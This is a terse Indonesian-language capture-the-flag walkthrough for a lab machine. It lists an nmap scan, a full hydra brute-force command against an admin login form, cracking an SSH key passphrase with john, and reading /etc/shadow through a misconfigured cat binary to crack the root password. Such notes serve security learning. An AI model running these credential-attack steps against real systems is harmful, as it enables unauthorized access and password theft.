# boot:
1. scan nmap 22 80 kebuka -> fuzz http 
2. ada login page cek source dapet uname -> brute force
3. hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV 10.10.64.1 http-post-form"/admin/:user=admin&pass=^PASS^:invalid"
4. tunggu -> dapet creds login -> ada rsa priv key -> tapi ada passphrase
5. ssh2john rsa > rsa.hash -> john rsa.hash --wordlist=/rockyou 
6. dapet ssh aja -> ssh gabisa ke admin ternyata -> ssh ke john aja
7. jan lupa chmod 600 rsa nya -> ssh -i rsa john@ip
8. klaim user flag


# PE:
1.  ada vuln di cat -> cat aja /etc/shadow buat crack passwd root
2. sebenernya klaim root bisa cuman enakan jadi root aja
3. ambil passwd dari : ampe : setelahnya -> john passwd.hash --wordlist=/rockyou
4. su root -> klaim flag
